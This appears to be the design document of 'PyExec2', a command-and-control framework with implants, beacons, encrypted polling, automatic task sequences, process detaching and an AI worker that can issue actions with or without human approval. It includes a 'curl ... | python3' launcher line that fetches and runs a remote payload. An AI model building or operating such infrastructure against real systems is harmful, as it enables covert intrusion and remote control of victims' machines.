# PyExec2 Rebuild — Current Program Flow

## 1. Component Topology

```mermaid
flowchart LR
    Browser[Browser / Operator UI]
    Web[clients/web_backend.py\n127.0.0.1:8765]
    Server[run.py Server API\n0.0.0.0:18080]
    Store[(data/ JSON/JSONL\nruntime/active_payloads)]
    Listener[Transport Listener\nUDP/TCP/HTTP/HTTPS/DNS]
    Implant[Python Implant\none-stage payload]
    AI[AI Worker / AI Approval]

    Browser -->|HTML + same-origin local API| Web
    Web -->|Bearer token + /api/action| Server
    AI -->|Bearer token + /api/action| Server
    Server --> Store
    Server --> Listener
    Implant -->|encrypted poll + DH client public| Listener
    Listener --> Server
```

## 2. First-Visit Web Connection

```mermaid
sequenceDiagram
    participant U as Operator
    participant W as Local Web Backend
    participant S as Server API

    U->>W: GET /
    W-->>U: React app (connection gate)
    U->>W: POST /api/connect {server, token}
    W->>S: GET /api/session Authorization: Bearer token
    alt valid
        S-->>W: role / approval_mode
        W-->>U: ok + role
        U->>W: POST /api/config (X-PyExec-Auth)
        W-->>U: save server + token locally
        U->>W: subsequent /api/action with X-PyExec-Auth
        W->>S: /api/action with Bearer token
    else invalid
        S-->>W: empty 401
        W-->>U: inline token error
    end
```

## 3. Listener, Payload and DH Bootstrap

```mermaid
sequenceDiagram
    participant U as Operator UI
    participant S as Server
    participant I as Implant
    participant T as Transport Listener

    U->>S: listener.create(protocol, bind, public_host)
    S->>T: bind UDP/TCP/HTTP/HTTPS/DNS
    U->>S: payload.generate(listener_id, settings)
    S->>S: generate DH private/public + payload token
    S-->>U: launcher (compressed/base64) + download URL
    U->>T: curl /p/<token> | python3
    T-->>I: launch Python
    I->>I: generate ephemeral client DH keypair
    I->>I: derive AEAD key from server DH public
    I->>T: POST poll {payload_token, client_pub, sealed inner}
    T->>S: transport_poll
    S->>S: bind client_pub on first use, derive same AEAD key
    S->>S: verify timestamp + nonce (new payloads)
    S->>T: sealed poll result
    T-->>I: sealed response
```

## 4. Task Dispatch and Result Chunking

```mermaid
sequenceDiagram
    participant U as Operator / Web
    participant S as Server TaskEngine
    participant I as Implant
    participant Q as Queue

    U->>S: task.create(beacon_id, plugin, args)
    S->>S: resolve base command by platform (cd -> lcd/wcd)
    S->>S: reject if Beacon offline
    S->>S: enforce task wire <= 20KB
    S->>Q: append task to beacon queue
    Q-->>S: queued
    I->>S: encrypted poll
    S->>Q: claim tasks (queued -> dispatched)
    S-->>I: sealed tasks
    I->>I: run task in thread
    I->>I: capture output + data
    I->>I: split result JSON into 12KB chunks with SHA-256
    loop each poll
        I->>S: result chunk(s)
        S->>S: persist chunks / verify hash
        S-->>I: ack chunk result_id
    end
    S->>S: reconstruct full result
    S->>S: record_result(output, data, status)
    U->>S: task.show / task.list
    S-->>U: complete output/result
```

## 5. Web Task Feedback

```mermaid
flowchart TD
    A[Operator clicks quick action or types command] --> B[Quick parameter modal or terminal parse]
    B --> C[runCommand / task.create]
    C --> D[Task status: 已下发]
    D --> E[Poll task.show]
    E --> F{status}
    F -->|queued| E
    F -->|dispatched| G[Status: Beacon 已获取任务]
    G --> E
    F -->|succeeded / failed / cancelled| H[Status: 已完成 / failed / cancelled]
    H --> I[Render full output/data]
    F -->|timeout| J[Status: 等待超时 + online warning]
```

## 6. AI Approval

```mermaid
flowchart TD
    A[AI worker action] --> B{approval_mode}
    B -->|all_allow| C[Execute directly]
    B -->|per_action| D[Create approval record actor=ai]
    D --> E[Human or AI approval token]
    E -->|approve| F{approver == creator?}
    F -->|AI self-approval| G[Reject: cannot approve own operation]
    F -->|human or separate AI approval| H[Execute original action]
    H --> I[Approval result + task]
    E -->|reject| J[Mark rejected]
```

## 7. Persistence and Restart

```mermaid
flowchart LR
    A[Server boot] --> B[Load data/ beacons, tasks, listeners]
    B --> C[Load runtime/active_payloads]
    C --> D[Restore payload DH private / client_pub / launcher]
    D --> E[Transport listeners restart]
    E --> F[Implant polls with same payload token + client key]
    F --> G[Beacon reactivated / task queue resumes]
    B --> H[Load Beacon note/stash/history]
    H --> I[Frontend displays same note/history]
```

## 8. Trust / Security Boundaries

- `Browser ↔ Local Web Backend`: same-origin, token header for local APIs, `sessionStorage` token.
- `Local Web Backend ↔ Server`: Bearer Human/AI/AI Approval token.
- `Server ↔ Implant`: payload token + ephemeral DH shared key + ChaCha20-Poly1305 sealed envelopes.
- `Server ↔ Payload download`: `/p/<payload-token>` is a bearer URL; launcher is compressed/base64 and contains no server DH private key.
- `Listener`: transport protocol maps create a socket only on the server machine.
- `Plugin execution`: implant plugins live on the target and are delivered as task source through the encrypted poll response.

## 9. Important Operational Rules

```text
18080  = API / no Web UI
8765   = local Web client only
listeners = server machine sockets
payloads = server generated; client only downloads a copy
base command = resolved to l/w plugin by Beacon platform
ICMP = intentionally disabled
```

## 10. Failure States

- Invalid control token: empty HTTP 401 from server; local Web gate blocks.
- Invalid payload token: empty 404.
- Offline Beacon task: explicit error, never silently queued.
- Oversized task: explicit 20KB transport-limit error; use 8KB upload chunks.
- Oversized result: split into 12KB chunks, reassembled with hash verification.
- Replayed poll: server returns no response for new replay-protected payloads.
- Server restart: active payload records and Beacon records reload; Beacon can reconnect.


## 11. Beacon Groups and Automatic Task Sequence

```mermaid
sequenceDiagram
    participant UI as Operator Web
    participant S as Server
    participant T as Beacon TaskEngine
    participant I as Implant

    UI->>S: group.create/edit {name, beacon_ids, batch_tasks}
    UI->>S: auto.global.set {tasks, ordered}
    I->>S: heartbeat/poll after reconnect
    S->>S: detect stale reconnect
    S->>T: arm_auto_sequence(global tasks for every Beacon)
    loop serial
        I->>S: poll
        T->>T: claim exactly one auto task
        S-->>I: auto task + auto_mode=true + interval_hint=2
        I->>I: execute task
        I->>S: result
        S->>T: record result
    end
    T->>T: mark auto sequence done
    I->>S: normal heartbeat poll
```

Group filter:

```text
group.beacon_ids
  -> Beacon page dropdown
  -> visibleBeacons = all beacons whose id is in selected group
```

Automatic vs batch:

```text
auto.global.tasks
  -> every Beacon reconnect
  -> serial one-at-a-time execution

group.batch_tasks
  -> 分组设置 -> 批量下发
  -> only currently online group members
  -> never auto-triggered
```


## 12. Protocol Upgrade and Fork

```mermaid
sequenceDiagram
    participant I as Implant
    participant S as Server
    I->>S: upgrade task result (staged new host/protocol/key)
    S->>S: seal ack with OLD key
    S->>S: rotate active payload token/key
    S-->>I: sealed ack
    I->>I: apply staged upgrade after ack
    I->>S: next poll with new protocol/key
```

Fork:

```text
parent process
  -> double fork + setsid
  -> intermediate exits
  -> detached final process (PPID 1)
  -> child runs the same Beacon main loop
  -> parent can exit without stopping child
```
